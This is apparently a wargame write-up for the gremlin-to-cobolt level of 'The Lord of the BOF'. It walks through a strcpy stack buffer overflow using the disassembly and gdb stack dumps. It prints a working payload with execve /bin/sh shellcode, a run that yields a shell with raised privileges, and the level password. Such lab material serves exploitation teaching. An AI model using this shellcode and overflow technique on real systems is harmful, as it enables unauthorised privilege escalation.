# Level 1, Gremlin -> Cobolt

### cobolt.c
```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - cobolt
        - small buffer
*/

int main(int argc, char *argv[])
{
    char buffer[16];               // -> Buffer is smaller than last prob. (gate)
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);       // -> strcpy() does not evaluate copying buffer length, enabling stack overflow
    printf("%s\n", buffer);
}
```

### Analysis

#### Disassembling the "cobolt"
```
Dump of assembler code for function main:
0x8048430 <main>:       push   %ebp
0x8048431 <main+1>:     mov    %ebp,%esp
0x8048433 <main+3>:     sub    %esp,16
0x8048436 <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x804843a <main+10>:    jg     0x8048453 <main+35>
0x804843c <main+12>:    push   0x80484d0
0x8048441 <main+17>:    call   0x8048350 <printf>
0x8048446 <main+22>:    add    %esp,4
0x8048449 <main+25>:    push   0
0x804844b <main+27>:    call   0x8048360 <exit>
0x8048450 <main+32>:    add    %esp,4
0x8048453 <main+35>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048456 <main+38>:    add    %eax,4
0x8048459 <main+41>:    mov    %edx,DWORD PTR [%eax]
0x804845b <main+43>:    push   %edx
0x804845c <main+44>:    lea    %eax,[%ebp-16]           -> [%ebp-16] = char buffer[16]
0x804845f <main+47>:    push   %eax
0x8048460 <main+48>:    call   0x8048370 <strcpy>
0x8048465 <main+53>:    add    %esp,8
0x8048468 <main+56>:    lea    %eax,[%ebp-16]
0x804846b <main+59>:    push   %eax
0x804846c <main+60>:    push   0x80484dc
0x8048471 <main+65>:    call   0x8048350 <printf>
0x8048476 <main+70>:    add    %esp,8
0x8048479 <main+73>:    leave
0x804847a <main+74>:    ret
End of assembler dump.
```

#### Estimated Stack Structure

```
|  BUFFER (16 bytes)          |
|  SFP (4 bytes)              |
|  RET (4 bytes)              |
|  ARGC (4 bytes)             |
|  Pointer to ARGV (4 bytes)  |
```

#### Observed Stack Structure (bp at *main+62)
```
Breakpoint 1, 0x8048468 in main ()
(gdb) x/100x $esp
0xbffffae8:     0x41414141      0x41414141      0x41414141      0x41414141  -> The 'buffer[16]'
0xbffffaf8:     0xbffffb00      0x400309cb      0x00000002      0xbffffb44  -> SFP, RET, ARGC, Pointer to ARGV[0]
0xbffffb08:     0xbffffb50      0x40013868      0x00000002      0x08048380
0xbffffb18:     0x00000000      0x080483a1      0x08048430      0x00000002
0xbffffb28:     0xbffffb44      0x080482e0      0x080484ac      0x4000ae60
0xbffffb38:     0xbffffb3c      0x40013e90      0x00000002      0xbffffc43
0xbffffb48:     0xbffffc5b      0x00000000      0xbffffc6c      0xbffffc7e
0xbffffb58:     0xbffffc97      0xbffffcb6      0xbffffcd8      0xbffffce5
0xbffffb68:     0xbffffea8      0xbffffec7      0xbffffee4      0xbffffef9
0xbffffb78:     0xbfffff18      0xbfffff23      0xbfffff33      0xbfffff3b
0xbffffb88:     0xbfffff4c      0xbfffff56      0xbfffff64      0xbfffff75
0xbffffb98:     0xbfffff83      0xbfffff8e      0xbfffffa1      0x00000000
0xbffffba8:     0x00000003      0x08048034      0x00000004      0x00000020
0xbffffbb8:     0x00000005      0x00000006      0x00000006      0x00001000
0xbffffbc8:     0x00000007      0x40000000      0x00000008      0x00000000
0xbffffbd8:     0x00000009      0x08048380      0x0000000b      0x000001f5
0xbffffbe8:     0x0000000c      0x000001f5      0x0000000d      0x000001f5
0xbffffbf8:     0x0000000e      0x000001f5      0x00000010      0x0fabfbff
0xbffffc08:     0x0000000f      0xbffffc3e      0x00000000      0x00000000
0xbffffc18:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc28:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc38:     0x00000000      0x36690000      0x2f003638      0x656d6f68
0xbffffc48:     0x6572672f      0x6e696c6d      0x626f632f      0x2d746c6f
0xbffffc58:     0x41006f63      0x41414141      0x41414141      0x41414141
0xbffffc68:     0x00414141      0x3d445750      0x6d6f682f      0x72672f65
```

### Exploit

#### Payload Structure
```
'\x90'*20   # Filling with NOP
+
'\xe8\xfa\xff\xbf'          # Shellcode address
+
'\x90'*50   # NOP Sled
+
'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'  # shellcode
```

#### Shellcode (24 bytes)
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

#### Final Payload
```
./cobolt `python -c "print '\x90'*20+'\xe8\xfa\xff\xbf'+'\x90'*50+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
```

### Result
```
[gremlin@localhost gremlin]$ ./cobolt `python -c "print '\x90'*20+'\xe8\xfa\xff\xbf'+'\x90'*50+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒ᙰ
             ̀
bash$ id
uid=501(gremlin) gid=501(gremlin) euid=502(cobolt) egid=502(cobolt) groups=501(gremlin)
bash$ my-pass
euid = 502
hacking exposed
```